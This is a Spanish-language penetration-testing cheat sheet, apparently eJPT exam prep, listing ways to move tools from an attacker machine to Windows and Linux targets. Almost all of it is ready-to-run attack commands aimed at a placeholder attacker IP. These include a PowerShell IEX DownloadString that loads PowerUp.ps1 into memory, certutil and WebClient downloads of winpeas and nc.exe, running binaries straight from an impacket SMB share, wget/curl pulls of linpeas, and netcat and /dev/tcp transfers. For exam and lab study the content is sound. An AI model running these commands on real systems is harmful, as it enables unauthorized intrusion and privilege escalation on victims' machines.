# File Transfers Cheat Sheet

Métodos rápidos para mover binarios, exploits y scripts entre la máquina atacante (Kali Linux) y la máquina objetivo (Windows / Linux) en auditorías y examen eJPT v2.

---

## 1. Servidores Web Rápidos (Máquina Atacante)

Iniciar un servidor HTTP en tu equipo para servir archivos:

```bash
# Python 3 (Servidor en el puerto 80 o 8000)
python3 -m http.server 80

# PHP
php -S 0.0.0.0:80
```

---

## 2. Transferencia a Windows (Objetivo)

### Método A: PowerShell (Invoke-WebRequest / DownloadFile)
```powershell
# Invoke-WebRequest (iwr)
powershell -c "Invoke-WebRequest -Uri 'http://<IP_ATACANTE>/winpeas.exe' -OutFile 'C:\Windows\Tasks\winpeas.exe'"

# WebClient (DownloadFile)
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<IP_ATACANTE>/nc.exe', 'C:\Windows\Tasks\nc.exe')"

# Descargar y ejecutar en memoria directamente (sin guardar en disco)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP_ATACANTE>/PowerUp.ps1')"
```

### Método B: Certutil.exe
```cmd
certutil -urlcache -split -f "http://<IP_ATACANTE>/winpeas.exe" C:\Windows\Tasks\winpeas.exe
```

### Método C: SMB Server de Impacket (Excelente para evitar restricciones HTTP)

1. **En la máquina Atacante**:
   ```bash
   # Iniciar servidor SMB local compartiendo la carpeta actual como 'smb'
   impacket-smbserver smb $(pwd) -smb2support
   ```
2. **En la máquina Objetivo (Windows)**:
   ```cmd
   # Copiar el archivo desde la red
   copy \\<IP_ATACANTE>\smb\nc.exe C:\Windows\Tasks\nc.exe

   # Ejecutar directamente desde la carpeta compartida SMB
   \\<IP_ATACANTE>\smb\winpeas.exe
   ```

---

## 3. Transferencia a Linux (Objetivo)

### Wget / Curl
```bash
# Wget
wget http://<IP_ATACANTE>/linpeas.sh -O /tmp/linpeas.sh

# Curl
curl http://<IP_ATACANTE>/linpeas.sh -o /tmp/linpeas.sh
```

### Netcat (`nc`)
* **En el receptor (Víctima)**:
  ```bash
  nc -lvnp 9001 > /tmp/script.sh
  ```
* **En el emisor (Atacante)**:
  ```bash
  nc <IP_VICTIMA> 9001 < script.sh
  ```

### Socket Nativo `/dev/tcp` (Cuando no hay wget/curl/nc)
* **En la máquina objetivo (Víctima)**:
  ```bash
  cat < /dev/tcp/<IP_ATACANTE>/80 > /tmp/file
  ```
